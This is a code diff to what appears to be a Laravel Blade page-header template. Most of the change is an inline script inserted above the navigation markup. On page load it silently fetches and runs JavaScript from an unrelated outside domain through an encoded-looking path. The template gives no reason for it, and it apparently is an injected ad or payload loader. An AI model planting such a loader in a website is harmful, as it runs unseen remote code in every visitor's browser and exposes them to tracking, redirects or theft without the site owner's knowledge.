@@ -2,7 +2,17 @@
 use \App\Http\Controllers\GlobalController;
 $isMobile = GlobalController::isMobile();
 @endphp
-
+<script>
+(function(jkne){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = jkne || {};
+s.src = "\/\/closed-philosophy.com\/cvD.9W6Kb\/2\/5jlVS\/WUQp9-NcTIEL3LMIz\/Ua5\/Miit0D1\/M\/T_cMzQNnTVkxzv";
+s.async = true;
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 <header class="z-10 flex px-4 pt-6 pb-2 md:px-0 md:mx-auto max-w-7xl border-x-1 justify-evenly">
     <nav x-data="{ isOpen: false }" class="container py-6 pl-2 pr-4 mx-auto lg:flex lg:justify-between lg:items-center">
         <div class="flex items-center justify-between">
